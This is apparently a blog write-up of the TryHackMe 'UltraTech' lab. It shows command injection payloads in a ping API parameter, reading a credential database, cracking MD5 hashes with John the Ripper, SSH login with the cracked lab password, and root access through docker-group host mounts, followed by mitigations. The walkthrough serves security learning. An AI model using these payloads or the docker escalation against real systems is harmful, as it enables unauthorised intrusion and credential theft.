---
layout: post
title: UltraTech
subtitle: TryHackMe Writeup - UltraTech
description: A step-by-step guide to rooting the UltraTech machine, covering API enumeration, command injection, hash cracking, and Docker privilege escalation.
image: https://tryhackme-images.s3.amazonaws.com/room-icons/e0f6687c43305e3b67a6cb38951d7b56.png
optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/e0f6687c43305e3b67a6cb38951d7b56.png
category: tryhackme
tags:
  - TryHackMe
  - Command Injection
  - JohnTheRipper
  - Docker Privilege Escalation
  - Linux
author: mustafa_altayeb
date: 2025-11-05 00:00:00 +0000
paginate: true
---
# UltraTech - TryHackMe Writeup

[UltraTech](https://tryhackme.com/room/ultratech1) is a medium-difficulty Linux machine that combines web enumeration, API command injection, and privilege escalation via Docker group membership.

**Difficulty**: Medium ⭐⭐  
**Operating System**: Linux (Ubuntu)  
**Themes**: Web Enumeration, API Exploitation, Command Injection, Docker Privilege Escalation

---

## Objectives
1. Enumerate web services across two HTTP ports.
2. Discover and exploit a command injection vulnerability in a Node.js API.
3. Crack password hashes to obtain SSH credentials.
4. Escalate privileges by abusing Docker group membership to gain root access.

---

## Reconnaissance

### Nmap Scan
A comprehensive `nmap` scan reveals the attack surface of the target machine.

```bash
nmap -p- -sCV -T4 10.10.157.117
```

**Results**:
```plaintext
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.5
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
8081/tcp open  http     Node.js Express framework
31331/tcp open http     Apache httpd 2.4.41 ((Ubuntu))
```

**Key Findings**:
*   **Port 8081**: Hosts a **Node.js Express** API.
*   **Port 31331**: Hosts an **Apache** web server, likely the front-end application.
*   Both SSH (port 22) and FTP (port 21) are open but require credentials.

---

## Web Enumeration

### Initial Access

#### 1. Access Node.js API (Port 8081)
Found a basic page showing "UltraTech API v0.1.3":
![Node.js API](/assets/TryHackMeRoomsImage/UltraTech/1.png)

#### 2. Access Apache Server (Port 31331)
Shows a normal website with nothing immediately interesting:
![Apache Website](/assets/TryHackMeRoomsImage/UltraTech/2.png)

### Discovery via JavaScript Analysis

#### 3. Found Critical JavaScript File
During directory enumeration, discovered `/js/api.js` containing this key code:
![API JavaScript Code](/assets/TryHackMeRoomsImage/UltraTech/3.png)

**Critical Code Analysis**:
```javascript
function runPing() {
    // Gets API URL and executes ping command
    $.get( "http://" + window.location.hostname + ":8081/ping?ip=" + window.location.hostname)
    // This is vulnerable to command injection
}
```

**Vulnerability**: The API endpoint `/ping` on port `8081` accepts an `ip` parameter and executes system commands without proper sanitization.

---

## Command Injection Exploitation

### 4. Testing Command Injection

#### A. Test `whoami` command
Payload: `http://10.10.157.117:8081/ping?ip=`whoami``

**Result**: Returns "www" confirming command execution as `www-data` user:
![whoami Command](/assets/TryHackMeRoomsImage/UltraTech/4.png)

#### B. Test `ls` command
Payload: `http://10.10.157.117:8081/ping?ip=`ls``

**Result**: Reveals a database file `utech.db.sqlite`:
![ls Command](/assets/TryHackMeRoomsImage/UltraTech/5.png)

#### C. Read Database File
Payload: `http://10.10.157.117:8081/ping?ip=`cat%20utech.db.sqlite``

**Result**: Extracts user credentials with MD5 hashes:
![Database Contents](/assets/TryHackMeRoomsImage/UltraTech/6.png)

**Extracted Credentials**:
```
r00t : f357a0c52799563c7c7b76c1e7543a32
admin : 0d0ea5111e3c1def594c1684e3b9be84
```

---

## Credential Cracking & SSH Access

### 5. Crack MD5 Hash with JohnTheRipper

```bash
# Save the hash
echo "f357a0c52799563c7c7b76c1e7543a32" > hash.txt

# Crack with rockyou wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=raw-md5
```

**Result**: Password found: `n100906`

### 6. SSH Access

```bash
ssh r00t@10.10.157.117
Password: n100906
```

**Access Gained**:
```bash
r00t@ip-10-10-157-117:~$ whoami
r00t
```

---

## Privilege Escalation

### 7. Enumeration

Check user privileges:
```bash
r00t@ultratech:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

**Critical Finding**: User is member of `docker` group → Privilege escalation path available.

### 8. Docker Group Exploitation

Using Docker to mount the host filesystem:

```bash
# Method 1: Simple chroot technique
docker run -v /:/mnt --rm -it bash chroot /mnt sh

# Method 2: Alternative approach
docker run -v /:/mnt -it alpine chroot /mnt sh
```

**How it works**:
- `-v /:/mnt`: Mounts host's root directory (`/`) to `/mnt` inside container
- `chroot /mnt sh`: Changes root to host's filesystem, giving root shell

### 9. Root Access Obtained

```bash
# Inside the Docker container after exploitation
# whoami
root

# Capture the final flag
# cat /root/root.txt
THM{your_root_flag_here}
```

---

## Key Takeaways

### Attack Path Summary:
```
Port Scanning → Web/JS Enumeration → Command Injection Discovery → 
Credential Harvesting via RCE → Hash Cracking → SSH Access → 
Docker Group Enumeration → Container Escape → Root Access
```

### Vulnerabilities Exploited:
1.  **Insecure Input Handling (Command Injection)**: The API endpoint on port 8081 didn't sanitize user input
2.  **Weak Password Storage**: Unsalted MD5 hashes easily cracked
3.  **Docker Misconfiguration**: User unnecessarily added to docker group

### Mitigation Strategies:
1.  **For API Security**:
    - Implement input validation and sanitization
    - Use allow-lists for expected input patterns
    - Store passwords with modern hashing algorithms (bcrypt/Argon2)

2.  **For System/Docker Security**:
    - Principle of least privilege for docker group
    - Regular audit of group memberships
    - Consider rootless Docker for production

### Tools Used:
- **Nmap** - Network reconnaissance
- **Ffuf/Gobuster** - Web directory enumeration  
- **JohnTheRipper** - Password hash cracking
- **Docker** - Privilege escalation vector

---
<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>

**Find me online**:  
• TryHackMe: [t4t4r1s](https://tryhackme.com/p/t4t4r1s)  
• LinkedIn: [Mustafa Altayeb](https://www.linkedin.com/in/t4t4r1s)  
• X: [@mustafa_altayeb](https://x.com/t4t4r1s)
---
